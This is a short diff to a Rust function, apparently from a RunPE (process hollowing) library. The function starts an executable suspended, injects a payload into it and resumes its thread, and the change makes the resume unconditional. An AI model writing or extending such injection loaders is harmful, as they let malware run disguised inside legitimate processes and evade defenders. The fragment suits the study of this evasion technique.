@@ -317,17 +317,16 @@ pub unsafe fn create_suspended_process(
 pub unsafe fn runpe(
     executable: *const i8,
     payload: Payload,
-    resume: bool,
     argument: Argument<'_>,
 ) -> Result<PROCESS_INFORMATION, RunpeError> {
     let processinfo = create_suspended_process(executable)?;
 
     match runpe_existing(processinfo.hProcess, processinfo.hThread, payload, argument) {
         Ok(_) => {
-            if resume {
+          
                 ResumeThread(processinfo.hThread);
-            }
-
+        
+            
             Ok(processinfo)
         }
         Err(err) => {
